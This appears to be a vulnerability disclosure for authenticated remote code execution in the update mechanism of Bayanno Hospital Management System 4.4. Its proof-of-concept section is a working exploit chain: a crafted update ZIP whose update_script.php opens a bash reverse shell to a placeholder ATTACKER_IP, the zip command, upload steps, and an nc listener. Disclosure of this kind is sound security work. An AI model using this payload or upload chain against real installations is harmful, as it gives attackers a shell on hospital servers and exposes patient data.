# Authenticated Remote Code Execution in Bayanno Hospital Management System 4.4 (Creativeitem)

## Summary

An **authenticated remote code execution (RCE)** vulnerability exists in the update mechanism of [Bayanno Hospital Management System 4.4](https://creativeitem.com/product/bayanno-hospital-management-system/) by Creativeitem. The updater controller allows an authenticated administrator to upload a ZIP archive containing arbitrary PHP code, which is later executed server-side without validation, integrity checks, or sandboxing. This enables a malicious admin to achieve full compromise of the web application and underlying server.

---

## Vulnerability Details

- **Affected Component:** `application/controllers/Updater.php` (Update Mechanism)
- **Vulnerability Type:** Authenticated Remote Code Execution (RCE)
- **Authentication Required:** Yes (Administrator)
- **Impact:** Complete compromise of the application and server

### Technical Description

The update feature allows an admin user to upload a ZIP file containing an update package. The server extracts the archive and executes `update_script.php` found within it, with no validation or sanitization. Attackers can craft a ZIP with a malicious `update_script.php`, gaining code execution with the web server's privileges.

---

## Proof of Concept (PoC)

### 1. Prepare Malicious ZIP

Directory structure:

```
update/
└── update_v2.3/
├── update_config.json
├── update_script.php
```

#### `update_config.json` 
```
json { "directory": [], "files": [] }
```

#### `update_script.php` 
```
<?php
// Reverse shell example (change IP and port)
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>
```

### 2. Zip the Payload

```
zip -r update_v2.3.zip update/
```

### 3. Upload the Malicious ZIP

- Login as administrator.
- Go to the Update section (/admin/update).
- Upload the update_v2.3.zip file.
- Trigger the update process.

![0b6fbb74-e30e-4dd5-83a2-23bc119e9040](https://github.com/user-attachments/assets/814d7415-60c1-47cb-b176-451468b603bb)

### 4. Get a Shell

```
nc -lvnp 4444
```
<img width="598" height="70" alt="image" src="https://github.com/user-attachments/assets/c612232a-fdf6-4cb3-b8b8-47a5fc28c77c" />


